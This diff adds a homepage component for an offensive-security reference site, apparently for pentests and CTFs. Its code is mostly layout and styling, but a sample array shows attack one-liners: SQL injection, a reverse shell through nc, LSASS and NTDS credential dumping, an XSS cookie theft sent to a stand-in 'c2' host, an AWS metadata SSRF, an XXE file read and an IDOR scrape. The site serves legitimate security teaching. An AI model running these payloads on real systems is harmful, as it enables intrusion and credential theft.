@@ -1,0 +1,916 @@
+---
+// src/components/Home.astro
+//
+// Homepage layout — self-contained, scoped styles, fits roughly one viewport
+// at common laptop resolutions (1280×720, 1440×900). Lives as an Astro
+// component (not raw MDX) so the CSS is reliably scoped instead of fighting
+// Starlight's global Markdown styles.
+//
+// Layout sketch:
+//
+//   ┌─────────────────────────────────────────────────────────────────┐
+//   │ ● codex / main  · 163 pages · 15 clusters       athena · cc-by  │  ← status strip
+//   ├──────────────────────────────────────┬──────────────────────────┤
+//   │  $ whoami                            │      [LOGO + glow]       │
+//   │  > offensive-security operator       │                          │
+//   │  $ codex --about                     │   163 pages              │
+//   │                                       │   15 clusters            │
+//   │  The Codex is a field reference...   │   3 sections             │
+//   │                                       │                          │
+//   │  [ $ enter the codex ]  [ github ↗ ] │                          │
+//   ├──────────────────────────────────────┴──────────────────────────┤
+//   │ $ ls codex/                                                     │
+//   │ ┌──────────┐  ┌────────────────┐  ┌──────────┐                  │
+//   │ │ network/ │  │ web/           │  │ windows/ │                  │
+//   │ │ 23 pages │  │ 130 pages (12) │  │ 10 pages │                  │
+//   │ └──────────┘  └────────────────┘  └──────────┘                  │
+//   ├─────────────────────────────────────────────────────────────────┤
+//   │ ◆ random      [tag · topic]      ↻ reroll                       │
+//   │   <code excerpt>                                                │
+//   └─────────────────────────────────────────────────────────────────┘
+//
+// Notable details:
+//   • The hero command lines TYPE THEMSELVES on page load (CSS @keyframes
+//     animation with steps()). One-time, not a loop — respect attention.
+//   • The big logo on the right side pulses gently (3s ease-in-out, alpha
+//     only — no movement) so the page doesn't feel dead.
+//   • Cluster cards have an animated accent rail that fills top-to-bottom
+//     on hover. Same primitive as the sidebar's active-page rail.
+//   • The reroll button has a subtle rotate-on-press microinteraction.
+//   • prefers-reduced-motion disables ALL animation including the typing.
+
+import CodexLogo from './CodexLogo.astro';
+
+const PAGE_COUNT = 163;
+const CLUSTER_COUNT = 15;
+const SECTION_COUNT = 3;
+
+const samples = [
+  // Single-line commands. Long ones will scroll horizontally in the
+  // display box. Multi-line is reserved for snippets that are genuinely
+  // multiple commands or structured content (XXE has two XML lines,
+  // NTDS dump has three sequential commands, IDOR loop is a bash block).
+  { tag: 'sqli',    topic: 'union-based · mysql',     code: "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", link: '/codex/web/sqli/union-based/' },
+  { tag: 'sqli',    topic: 'blind · time-based',      code: "1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -",                                                          link: '/codex/web/sqli/blind/' },
+  { tag: 'privesc', topic: 'win · SeImpersonate',     code: 'PrintSpoofer.exe -c "nc.exe 10.10.14.3 443 -e cmd.exe"',                                                            link: '/codex/windows/privesc/seimpersonate/' },
+  { tag: 'privesc', topic: 'win · SeDebug',           code: 'rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full',                                  link: '/codex/windows/privesc/sedebugprivilege/' },
+  { tag: 'privesc', topic: 'win · NTDS dump',         code: 'diskshadow.exe /s diskshadow.txt\nCopy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit .\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL', link: '/codex/windows/privesc/backup-operators/' },
+  { tag: 'recon',   topic: 'net · smb sweep',         code: "nxc smb 10.10.10.0/24 -u '' -p '' --shares",                                                                         link: '/codex/network/services/smb/' },
+  { tag: 'recon',   topic: 'net · dns axfr',          code: 'dig axfr @ns1.target.tld target.tld',                                                                                link: '/codex/network/services/dns/' },
+  { tag: 'xss',     topic: 'web · reflected',         code: '"><svg/onload="fetch(\'//c2/\'+document.cookie)">',                                                                  link: '/codex/web/xss/' },
+  { tag: 'ssrf',    topic: 'web · aws metadata',      code: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',                                              link: '/codex/web/server-side/ssrf/' },
+  { tag: 'xxe',     topic: 'web · file read',         code: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>',                                      link: '/codex/web/xxe/' },
+  { tag: 'idor',    topic: 'web · authz scrape',      code: 'for i in $(seq 1 5000); do\n  curl -s -b "session=$C" "https://app/api/orders/$i"\ndone | grep -l credit_card',     link: '/codex/web/idor/' },
+  { tag: 'recon',   topic: 'net · wmi exec',          code: "wmiexec.py -shell-type powershell DOMAIN/user:'P@ss'@10.10.10.5",                                                    link: '/codex/network/services/wmi/' },
+];
+---
+
+<div class="ch-root">
+
+  <!-- ────────────── top status strip ────────────── -->
+  <div class="ch-statusbar">
+    <span class="ch-status-cell ch-status-cell--accent">
+      <span class="ch-status-dot"></span>
+      codex / main
+    </span>
+    <span class="ch-status-sep">·</span>
+    <span class="ch-status-cell">{PAGE_COUNT} pages</span>
+    <span class="ch-status-sep">·</span>
+    <span class="ch-status-cell">{CLUSTER_COUNT} clusters</span>
+    <span class="ch-status-sep">·</span>
+    <span class="ch-status-cell">{SECTION_COUNT} sections</span>
+    <span class="ch-status-spacer"></span>
+    <a class="ch-status-link" href="https://athenaos.org" target="_blank" rel="noopener">athena-os</a>
+    <span class="ch-status-sep">·</span>
+    <span class="ch-status-cell ch-status-cell--muted">cc-by-sa-4.0</span>
+  </div>
+
+  <!-- ────────────── hero ────────────── -->
+  <section class="ch-hero">
+    <div class="ch-hero__col-left">
+      <div class="ch-term" aria-hidden="true">
+        <div class="ch-term__line ch-term__line--type ch-term__line--t1">
+          <span class="ch-term__sigil">$</span><span class="ch-term__cmd">whoami</span>
+        </div>
+        <div class="ch-term__line ch-term__line--out ch-term__line--t2">offensive-security operator</div>
+        <div class="ch-term__line ch-term__line--type ch-term__line--t3">
+          <span class="ch-term__sigil">$</span><span class="ch-term__cmd">codex {`--about`}</span><span class="ch-term__caret"></span>
+        </div>
+      </div>
+
+      <p class="ch-hero__readme">
+        The <strong>Codex</strong> is a field reference for pentests, CTFs, and
+        certifications. <strong>Command-first</strong>: technique, payload,
+        success indicator. No theory you don't need. OS-agnostic.
+      </p>
+
+      <div class="ch-hero__actions">
+        <a class="ch-btn ch-btn--primary" href="/codex/network/recon/">
+          <span class="ch-btn__sigil">$</span> enter the codex
+        </a>
+        <a class="ch-btn ch-btn--ghost" href="https://github.com/Athena-OS/codex" target="_blank" rel="noopener">
+          github <span class="ch-btn__icon">↗</span>
+        </a>
+      </div>
+    </div>
+
+    <div class="ch-hero__col-right">
+      <div class="ch-glyph">
+        <div class="ch-glyph__halo"></div>
+        <div class="ch-glyph__ring"></div>
+        <CodexLogo size={140} class="ch-glyph__logo" />
+        <div class="ch-glyph__scan"></div>
+      </div>
+      <div class="ch-stats">
+        <div class="ch-stat">
+          <span class="ch-stat__n">{PAGE_COUNT}</span>
+          <span class="ch-stat__l">pages</span>
+        </div>
+        <div class="ch-stat">
+          <span class="ch-stat__n">{CLUSTER_COUNT}</span>
+          <span class="ch-stat__l">clusters</span>
+        </div>
+        <div class="ch-stat">
+          <span class="ch-stat__n">{SECTION_COUNT}</span>
+          <span class="ch-stat__l">sections</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ────────────── cluster grid ────────────── -->
+  <section class="ch-clusters">
+    <div class="ch-section-head">
+      <span class="ch-section-head__sigil">$</span>
+      <span class="ch-section-head__cmd">ls codex/</span>
+    </div>
+
+    <div class="ch-clusters__grid">
+
+      <div class="ch-card">
+        <div class="ch-card__rail"></div>
+        <div class="ch-card__head">
+          <span class="ch-card__sigil">[01]</span>
+          <span class="ch-card__name">network/</span>
+          <span class="ch-card__count">23</span>
+        </div>
+        <ul class="ch-card__items">
+          <li><a href="/codex/network/recon/"><span>reconnaissance</span><span class="ch-card__sub">5</span></a></li>
+          <li><a href="/codex/network/services/"><span>service footprinting</span><span class="ch-card__sub">18</span></a></li>
+        </ul>
+      </div>
+
+      <div class="ch-card ch-card--wide">
+        <div class="ch-card__rail"></div>
+        <div class="ch-card__head">
+          <span class="ch-card__sigil">[02]</span>
+          <span class="ch-card__name">web/</span>
+          <span class="ch-card__count">130</span>
+        </div>
+        <ul class="ch-card__items ch-card__items--cols">
+          <li><a href="/codex/web/sqli/"><span>sql injection</span><span class="ch-card__sub">21</span></a></li>
+          <li><a href="/codex/web/server-side/"><span>server-side</span><span class="ch-card__sub">25</span></a></li>
+          <li><a href="/codex/web/auth/"><span>auth &amp; sessions</span><span class="ch-card__sub">12</span></a></li>
+          <li><a href="/codex/web/sessions/"><span>sessions</span><span class="ch-card__sub">10</span></a></li>
+          <li><a href="/codex/web/wordpress/"><span>wordpress</span><span class="ch-card__sub">10</span></a></li>
+          <li><a href="/codex/web/lfi/"><span>lfi / rfi</span><span class="ch-card__sub">9</span></a></li>
+          <li><a href="/codex/web/uploads/"><span>file upload</span><span class="ch-card__sub">8</span></a></li>
+          <li><a href="/codex/web/xss/"><span>xss</span><span class="ch-card__sub">8</span></a></li>
+          <li><a href="/codex/web/command-injection/"><span>command injection</span><span class="ch-card__sub">8</span></a></li>
+          <li><a href="/codex/web/web-services/"><span>web services</span><span class="ch-card__sub">7</span></a></li>
+          <li><a href="/codex/web/xxe/"><span>xxe</span><span class="ch-card__sub">7</span></a></li>
+          <li><a href="/codex/web/idor/"><span>idor</span><span class="ch-card__sub">5</span></a></li>
+        </ul>
+      </div>
+
+      <div class="ch-card">
+        <div class="ch-card__rail"></div>
+        <div class="ch-card__head">
+          <span class="ch-card__sigil">[03]</span>
+          <span class="ch-card__name">windows/</span>
+          <span class="ch-card__count">10</span>
+        </div>
+        <ul class="ch-card__items">
+          <li><a href="/codex/windows/privesc/"><span>privilege escalation</span><span class="ch-card__sub">10</span></a></li>
+        </ul>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ────────────── random sample ────────────── -->
+  <section class="ch-sample">
+    <div class="ch-section-head ch-section-head--row">
+      <div>
+        <span class="ch-section-head__sigil">$</span>
+        <span class="ch-section-head__cmd">codex {`--random`}</span>
+      </div>
+      <button type="button" class="ch-reroll" id="ch-reroll" aria-label="Show another sample">
+        <span class="ch-reroll__icon" aria-hidden="true">↻</span> reroll
+      </button>
+    </div>
+
+    <div class="ch-sample__card" id="ch-sample-card">
+      <div class="ch-sample__meta">
+        <span class="ch-sample__tag" id="ch-sample-tag">{samples[0].tag}</span>
+        <span class="ch-sample__sep">·</span>
+        <span class="ch-sample__topic" id="ch-sample-topic">{samples[0].topic}</span>
+        <span class="ch-sample__spacer"></span>
+        <a class="ch-sample__link" id="ch-sample-link" href={samples[0].link}>see page →</a>
+      </div>
+      <pre class="ch-sample__code"><code id="ch-sample-code">{samples[0].code}</code></pre>
+    </div>
+  </section>
+
+</div>
+
+<!-- ────────────── reroll script ────────────── -->
+<script is:inline data-samples={JSON.stringify(samples)}>
+  (function () {
+    const script = document.currentScript;
+    const samples = JSON.parse(script.dataset.samples || '[]');
+
+    const card  = document.getElementById('ch-sample-card');
+    const tag   = document.getElementById('ch-sample-tag');
+    const topic = document.getElementById('ch-sample-topic');
+    const code  = document.getElementById('ch-sample-code');
+    const link  = document.getElementById('ch-sample-link');
+    const btn   = document.getElementById('ch-reroll');
+    if (!card || !btn) return;
+
+    let lastIndex = 0;
+    function pick() {
+      if (samples.length <= 1) return samples[0];
+      let i;
+      do { i = Math.floor(Math.random() * samples.length); }
+      while (i === lastIndex);
+      lastIndex = i;
+      return samples[i];
+    }
+    function paint(s) {
+      tag.textContent = s.tag;
+      topic.textContent = s.topic;
+      code.textContent = s.code;
+      link.setAttribute('href', s.link);
+      // Reset horizontal scroll so each new snippet starts at the left
+      // rather than retaining the scroll position from a previous long
+      // command. The <pre> (code's parent) is the scrolling element.
+      if (code.parentElement) code.parentElement.scrollLeft = 0;
+    }
+
+    // Initial random pick on load (so returning visitors see variety)
+    const initial = pick();
+    paint(initial);
+
+    btn.addEventListener('click', function () {
+      card.classList.remove('ch-sample__card--in');
+      // Force reflow so the animation re-triggers
+      void card.offsetWidth;
+      setTimeout(function () {
+        paint(pick());
+        card.classList.add('ch-sample__card--in');
+      }, 140);
+    });
+
+    // Add the entry class once mounted (initial fade-in)
+    requestAnimationFrame(function () {
+      card.classList.add('ch-sample__card--in');
+    });
+  })();
+</script>
+
+<style is:global>
+  /* Hide Starlight's auto-injected splash-template hero block on the
+     homepage. The empty `tagline` / `actions` in frontmatter doesn't
+     suppress the H1 — Starlight still emits `<div class="hero">` with
+     the page title and reserves vertical space for it.
+     We hide it ONLY where the .ch-root marker is present (homepage), so
+     other splash-template pages would still render their hero normally. */
+  body:has(.ch-root) .content-panel:first-of-type .hero {
+    display: none;
+  }
+  /* The content-panel surrounding the now-hidden hero still has its own
+     top/bottom padding that we want to collapse on the homepage. */
+  body:has(.ch-root) .content-panel:first-of-type {
+    padding-top: 0;
+    padding-bottom: 0;
+    border-bottom: none;
+  }
+</style>
+
+<style>
+  /* ====================================================================
+     Scoped homepage styles. Lives inside an Astro component so Vite
+     auto-scopes the selectors to this template — no fights with global
+     Starlight Markdown CSS, no risk of leaking into other pages.
+
+     All accent colors pull from --codex-accent / --codex-accent-bright /
+     --codex-accent-rgb defined in codex.css. The aurora hue tuner
+     recolors this page along with everything else.
+     ==================================================================== */
+
+  .ch-root {
+    max-width: 1180px;
+    margin: 0 auto;
+    padding: 1.25rem 1.5rem 2.5rem;
+    font-family: var(--codex-font-mono);
+    color: var(--codex-fg, #e0e0e0);
+  }
+
+  /* Pull the homepage tight against the page-top spacing that Starlight
+     adds for the hero region of splash templates. */
+  .ch-root > *:first-child {
+    margin-top: 0;
+  }
+
+  /* ── Status strip ───────────────────────────────────────────────── */
+
+  .ch-statusbar {
+    display: flex;
+    align-items: center;
+    gap: 0.4rem;
+    flex-wrap: wrap;
+    padding: 0.45rem 0.85rem;
+    margin-bottom: 1.75rem;
+    font-size: 0.78rem;
+    letter-spacing: 0.02em;
+    border: 1px solid var(--codex-accent-border);
+    background: linear-gradient(90deg,
+      var(--codex-accent-softer) 0%,
+      transparent 100%);
+    border-radius: 2px;
+    color: var(--codex-fg-dim, #aaa);
+    user-select: none;
+  }
+
+  .ch-status-cell { display: inline-flex; align-items: center; gap: 0.4rem; }
+  .ch-status-cell--accent { color: var(--codex-accent); }
+  .ch-status-cell--muted { color: var(--codex-fg-muted, #666); }
+
+  .ch-status-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--codex-success, #a3be8c);
+    box-shadow: 0 0 8px rgba(163, 190, 140, 0.8);
+    animation: ch-pulse-dot 2.5s ease-in-out infinite;
+  }
+
+  @keyframes ch-pulse-dot {
+    0%, 100% { opacity: 1; }
+    50%      { opacity: 0.45; }
+  }
+
+  .ch-status-sep   { color: var(--codex-accent-dim); opacity: 0.5; }
+  .ch-status-spacer{ flex: 1; min-width: 1rem; }
+
+  .ch-status-link {
+    color: inherit;
+    text-decoration: none;
+    border-bottom: 1px dashed var(--codex-accent-border);
+    transition: color 0.15s, border-color 0.15s;
+  }
+  .ch-status-link:hover {
+    color: var(--codex-accent);
+    border-bottom-color: var(--codex-accent);
+  }
+
+  /* ── Hero ───────────────────────────────────────────────────────── */
+
+  .ch-hero {
+    display: grid;
+    grid-template-columns: 1.4fr 1fr;
+    gap: 2.5rem;
+    align-items: center;
+    margin-bottom: 2.25rem;
+    padding: 1.75rem 1.75rem 1.75rem 1.75rem;
+    border: 1px solid var(--codex-accent-border);
+    border-left: 2px solid var(--codex-accent);
+    background:
+      linear-gradient(135deg,
+        var(--codex-accent-soft) 0%,
+        transparent 50%,
+        var(--codex-accent-softer) 100%);
+    border-radius: 3px;
+    box-shadow:
+      inset 0 0 0 1px rgba(var(--codex-accent-rgb, 180, 142, 173), 0.05),
+      0 0 40px rgba(var(--codex-accent-rgb, 180, 142, 173), 0.06);
+  }
+
+  .ch-hero__col-left  { min-width: 0; }
+  .ch-hero__col-right {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1.25rem;
+  }
+
+  /* Terminal block — typed reveal animation */
+
+  .ch-term {
+    font-family: var(--codex-font-mono);
+    font-size: 0.95rem;
+    line-height: 1.7;
+    margin-bottom: 1.25rem;
+  }
+
+  .ch-term__line {
+    display: block;
+    white-space: pre;
+    overflow: hidden;
+  }
+
+  .ch-term__sigil {
+    color: var(--codex-accent);
+    font-weight: 700;
+    margin-right: 0.6rem;
+  }
+
+  .ch-term__cmd { color: var(--codex-accent-bright); }
+  .ch-term__line--out {
+    color: var(--codex-fg-dim, #aaa);
+    padding-left: 1.5ch;
+  }
+
+  /* Typewriter — width: 0 → 100%, steps() for the chunked reveal */
+
+  .ch-term__line--type {
+    width: 0;
+    animation: ch-type 0.7s steps(20, end) forwards;
+  }
+  .ch-term__line--out {
+    opacity: 0;
+    animation: ch-fade 0.4s ease forwards;
+  }
+  .ch-term__line--t1 { animation-delay: 0.15s; }
+  .ch-term__line--t2 { animation-delay: 0.95s;  width: max-content; }
+  .ch-term__line--t3 { animation-delay: 1.40s; }
+
+  @keyframes ch-type {
+    from { width: 0; }
+    to   { width: max-content; }
+  }
+  @keyframes ch-fade {
+    from { opacity: 0; transform: translateY(2px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .ch-term__caret {
+    display: inline-block;
+    width: 8px;
+    height: 1em;
+    margin-left: 2px;
+    background: var(--codex-accent-bright);
+    vertical-align: -2px;
+    animation: ch-caret-blink 1s steps(2, end) infinite;
+  }
+  @keyframes ch-caret-blink {
+    50% { opacity: 0; }
+  }
+
+  /* Readme paragraph */
+
+  .ch-hero__readme {
+    font-family: var(--codex-font-sans);
+    font-size: 1.02rem;
+    line-height: 1.6;
+    color: var(--codex-fg, #e0e0e0);
+    max-width: 56ch;
+    margin: 0 0 1.5rem;
+  }
+  .ch-hero__readme strong { color: var(--codex-accent-bright); }
+
+  /* Buttons */
+
+  .ch-hero__actions { display: flex; gap: 0.75rem; flex-wrap: wrap; }
+
+  .ch-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.7rem 1.25rem;
+    font-family: var(--codex-font-mono);
+    font-size: 0.92rem;
+    font-weight: 500;
+    text-decoration: none;
+    border: 1px solid transparent;
+    border-radius: 2px;
+    letter-spacing: 0.02em;
+    cursor: pointer;
+    transition: background 0.18s, border-color 0.18s, color 0.18s,
+                box-shadow 0.18s, transform 0.05s;
+  }
+
+  .ch-btn--primary {
+    background: var(--codex-accent-soft);
+    border-color: var(--codex-accent);
+    color: var(--codex-accent-bright);
+    box-shadow:
+      0 0 0 1px var(--codex-accent-border),
+      0 0 18px rgba(var(--codex-accent-rgb, 180, 142, 173), 0.30);
+  }
+  .ch-btn--primary:hover {
+    background: var(--codex-accent);
+    color: var(--codex-bg, #0d0d0f);
+    box-shadow:
+      0 0 0 1px var(--codex-accent-bright),
+      0 0 28px rgba(var(--codex-accent-rgb, 180, 142, 173), 0.55);
+  }
+  .ch-btn--primary:active { transform: translateY(1px); }
+
+  .ch-btn--ghost {
+    background: transparent;
+    border-color: var(--codex-accent-border);
+    color: var(--codex-fg-dim, #aaa);
+  }
+  .ch-btn--ghost:hover {
+    border-color: var(--codex-accent);
+    color: var(--codex-accent-bright);
+  }
+
+  .ch-btn__sigil { color: inherit; font-weight: 700; }
+  .ch-btn__icon  { font-size: 0.85em; opacity: 0.7; }
+
+  /* ── Right-column glyph + stats ─────────────────────────────────── */
+
+  .ch-glyph {
+    position: relative;
+    width: 200px;
+    height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  /* Soft pulsing halo behind the logo */
+  .ch-glyph__halo {
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    background: radial-gradient(
+      circle,
+      rgba(var(--codex-accent-rgb, 180, 142, 173), 0.35) 0%,
+      rgba(var(--codex-accent-rgb, 180, 142, 173), 0.10) 40%,
+      transparent 70%
+    );
+    filter: blur(8px);
+    animation: ch-halo-pulse 4s ease-in-out infinite;
+  }
+  @keyframes ch-halo-pulse {
+    0%, 100% { opacity: 0.7; transform: scale(1);    }
+    50%      { opacity: 1.0; transform: scale(1.06); }
+  }
+
+  /* Slowly rotating ring framing the logo */
+  .ch-glyph__ring {
+    position: absolute;
+    width: 170px;
+    height: 170px;
+    border-radius: 50%;
+    border: 1px dashed var(--codex-accent-border);
+    border-top-color: var(--codex-accent);
+    border-right-color: var(--codex-accent-border-strong);
+    animation: ch-ring-rotate 18s linear infinite;
+  }
+  @keyframes ch-ring-rotate {
+    from { transform: rotate(0deg); }
+    to   { transform: rotate(360deg); }
+  }
+
+  .ch-glyph__logo {
+    position: relative;
+    z-index: 2;
+    color: var(--codex-accent-bright);
+    filter: drop-shadow(0 0 14px rgba(var(--codex-accent-rgb, 180, 142, 173), 0.55));
+  }
+
+  /* Scan-line that sweeps top→bottom through the logo region */
+  .ch-glyph__scan {
+    position: absolute;
+    left: 12%;
+    right: 12%;
+    height: 2px;
+    background: linear-gradient(90deg,
+      transparent 0%,
+      var(--codex-accent) 30%,
+      var(--codex-accent-bright) 50%,
+      var(--codex-accent) 70%,
+      transparent 100%);
+    box-shadow: 0 0 8px var(--codex-accent);
+    opacity: 0;
+    z-index: 3;
+    animation: ch-scan 3.5s ease-in-out infinite;
+  }
+  @keyframes ch-scan {
+    0%   { top:  15%; opacity: 0;   }
+    10%  { opacity: 0.8; }
+    50%  { top:  82%; opacity: 0.8; }
+    60%  { opacity: 0;   }
+    100% { top:  82%; opacity: 0;   }
+  }
+
+  /* Stats row under the logo */
+  .ch-stats {
+    display: flex;
+    gap: 1.5rem;
+    align-items: baseline;
+    font-family: var(--codex-font-mono);
+  }
+  .ch-stat { text-align: center; line-height: 1.2; }
+  .ch-stat__n {
+    display: block;
+    font-size: 1.5rem;
+    font-weight: 600;
+    color: var(--codex-accent-bright);
+    letter-spacing: -0.02em;
+  }
+  .ch-stat__l {
+    display: block;
+    font-size: 0.72rem;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--codex-fg-muted, #666);
+  }
+
+  /* ── Cluster grid ───────────────────────────────────────────────── */
+
+  .ch-clusters { margin-bottom: 1.75rem; }
+
+  .ch-section-head {
+    font-family: var(--codex-font-mono);
+    font-size: 0.95rem;
+    color: var(--codex-fg-dim, #aaa);
+    margin-bottom: 0.9rem;
+    padding-bottom: 0.45rem;
+    border-bottom: 1px solid var(--codex-accent-border);
+    letter-spacing: 0.02em;
+  }
+  .ch-section-head--row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1rem;
+  }
+  .ch-section-head__sigil { color: var(--codex-accent); font-weight: 700; margin-right: 0.5rem; }
+  .ch-section-head__cmd { color: var(--codex-fg, #e0e0e0); }
+
+  .ch-clusters__grid {
+    display: grid;
+    grid-template-columns: 0.9fr 1.6fr 0.9fr;
+    gap: 0.85rem;
+  }
+
+  .ch-card {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    padding: 1rem 1.1rem 0.85rem 1.25rem;
+    background: var(--codex-bg-elevated, #14141a);
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 3px;
+    color: inherit;
+    overflow: hidden;
+    transition: border-color 0.18s, background 0.18s;
+  }
+
+  /* Accent rail along the left edge — brightens when any row inside is hovered */
+  .ch-card__rail {
+    position: absolute;
+    left: 0;
+    top: 0;
+    bottom: 0;
+    width: 2px;
+    background: var(--codex-accent);
+    opacity: 0.35;
+    transition: opacity 0.18s, box-shadow 0.18s;
+  }
+  /* When the card is being interacted with (hover anywhere on it), surface it */
+  .ch-card:hover {
+    border-color: var(--codex-accent-border-strong);
+  }
+  .ch-card:hover .ch-card__rail {
+    opacity: 1;
+    box-shadow: 0 0 12px var(--codex-accent);
+  }
+
+  .ch-card__head {
+    display: flex;
+    align-items: baseline;
+    gap: 0.5rem;
+    margin-bottom: 0.6rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--codex-border, #2a2a2e);
+  }
+  .ch-card__sigil {
+    color: var(--codex-accent);
+    font-weight: 700;
+    font-size: 0.78rem;
+  }
+  .ch-card__name {
+    font-family: var(--codex-font-mono);
+    font-size: 1.05rem;
+    font-weight: 600;
+    color: var(--codex-fg, #e0e0e0);
+  }
+  .ch-card__count {
+    margin-left: auto;
+    font-family: var(--codex-font-mono);
+    font-size: 0.72rem;
+    padding: 0.08rem 0.4rem;
+    border: 1px solid var(--codex-accent-border);
+    border-radius: 2px;
+    background: var(--codex-accent-softer);
+    color: var(--codex-accent);
+  }
+
+  .ch-card__items {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+    font-family: var(--codex-font-mono);
+    font-size: 0.82rem;
+  }
+  .ch-card__items li { padding: 0; margin: 0; }
+
+  /* Each row is its own link */
+  .ch-card__items li a {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    gap: 0.5rem;
+    padding: 0.28rem 0.4rem 0.28rem 0.55rem;
+    margin: 0 -0.4rem 0 -0.55rem;  /* full-bleed background on hover */
+    color: var(--codex-fg-dim, #aaa);
+    line-height: 1.4;
+    text-decoration: none;
+    border-left: 2px solid transparent;
+    border-radius: 0 2px 2px 0;
+    transition: background 0.12s ease, color 0.12s ease, border-color 0.12s ease;
+  }
+  .ch-card__items li a:hover {
+    background: var(--codex-accent-softer);
+    color: var(--codex-fg, #e0e0e0);
+    border-left-color: var(--codex-accent);
+  }
+  .ch-card__items li a:hover .ch-card__sub {
+    color: var(--codex-accent);
+  }
+
+  .ch-card__items--cols {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    column-gap: 1rem;
+    row-gap: 0;
+  }
+  .ch-card__sub {
+    color: var(--codex-fg-muted, #666);
+    flex-shrink: 0;
+    transition: color 0.12s ease;
+  }
+
+  /* ── Random sample ──────────────────────────────────────────────── */
+
+  .ch-sample__card {
+    border: 1px solid var(--codex-accent-border);
+    border-radius: 3px;
+    background: var(--codex-bg-elevated, #14141a);
+    padding: 0.85rem 1.1rem 1rem;
+    position: relative;
+    overflow: hidden;
+    opacity: 0;
+    transform: translateY(4px);
+    transition: opacity 0.25s ease, transform 0.25s ease;
+  }
+  .ch-sample__card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 2px;
+    background: linear-gradient(180deg,
+      var(--codex-accent) 0%,
+      var(--codex-accent-bright) 50%,
+      var(--codex-accent) 100%);
+    box-shadow: 0 0 8px var(--codex-accent);
+  }
+  .ch-sample__card--in { opacity: 1; transform: translateY(0); }
+
+  .ch-sample__meta {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-family: var(--codex-font-mono);
+    font-size: 0.78rem;
+    color: var(--codex-fg-muted, #666);
+    margin-bottom: 0.6rem;
+  }
+  .ch-sample__tag {
+    color: var(--codex-accent);
+    padding: 0.08rem 0.45rem;
+    border: 1px solid var(--codex-accent-border);
+    border-radius: 2px;
+    background: var(--codex-accent-softer);
+    font-size: 0.72rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+  .ch-sample__sep   { color: var(--codex-accent-dim); opacity: 0.5; }
+  .ch-sample__topic { color: var(--codex-fg-dim, #aaa); }
+  .ch-sample__spacer{ flex: 1; }
+  .ch-sample__link {
+    color: var(--codex-accent);
+    text-decoration: none;
+    border-bottom: 1px solid transparent;
+    transition: border-color 0.15s, color 0.15s;
+  }
+  .ch-sample__link:hover {
+    color: var(--codex-accent-bright);
+    border-bottom-color: var(--codex-accent-bright);
+  }
+
+  .ch-sample__code {
+    margin: 0;
+    padding: 0.7rem 0.95rem;
+    background: var(--codex-bg, #0d0d0f);
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 2px;
+    font-family: var(--codex-font-mono);
+    font-size: 0.85rem;
+    line-height: 1.55;
+    color: var(--codex-fg, #e0e0e0);
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .ch-sample__code code {
+    color: inherit;
+    background: transparent;
+    padding: 0;
+    border: 0;
+    font-size: inherit;
+  }
+
+  /* Reroll button */
+
+  .ch-reroll {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    padding: 0.35rem 0.85rem;
+    font-family: var(--codex-font-mono);
+    font-size: 0.78rem;
+    background: transparent;
+    border: 1px solid var(--codex-accent-border);
+    color: var(--codex-fg-dim, #aaa);
+    border-radius: 2px;
+    cursor: pointer;
+    transition: background 0.15s, border-color 0.15s, color 0.15s;
+  }
+  .ch-reroll:hover {
+    border-color: var(--codex-accent);
+    color: var(--codex-accent-bright);
+    background: var(--codex-accent-softer);
+  }
+  .ch-reroll:active .ch-reroll__icon { transform: rotate(180deg); }
+  .ch-reroll__icon {
+    display: inline-block;
+    transition: transform 0.4s ease;
+  }
+
+  /* ── Responsive ──────────────────────────────────────────────────── */
+
+  @media (max-width: 980px) {
+    .ch-hero {
+      grid-template-columns: 1fr;
+      gap: 1.5rem;
+    }
+    .ch-hero__col-right { order: -1; }
+    .ch-glyph { width: 160px; height: 160px; }
+    .ch-clusters__grid { grid-template-columns: 1fr; }
+    .ch-card__items--cols { grid-template-columns: 1fr; }
+  }
+
+  @media (max-width: 600px) {
+    .ch-root { padding: 1rem 0.85rem 2rem; }
+    .ch-hero { padding: 1.2rem 1.1rem; }
+    .ch-stats { gap: 1rem; }
+    .ch-stat__n { font-size: 1.25rem; }
+  }
+
+  /* ── Honor reduced-motion ──────────────────────────────────────────
+     Disable every animation we defined. Static rendering still looks fine
+     because each animation's final state is reached anyway (forwards). */
+
+  @media (prefers-reduced-motion: reduce) {
+    .ch-term__line--type,
+    .ch-term__line--out,
+    .ch-term__caret,
+    .ch-status-dot,
+    .ch-glyph__halo,
+    .ch-glyph__ring,
+    .ch-glyph__scan {
+      animation: none !important;
+    }
+    .ch-term__line--type { width: max-content; }
+    .ch-term__line--out  { opacity: 1; }
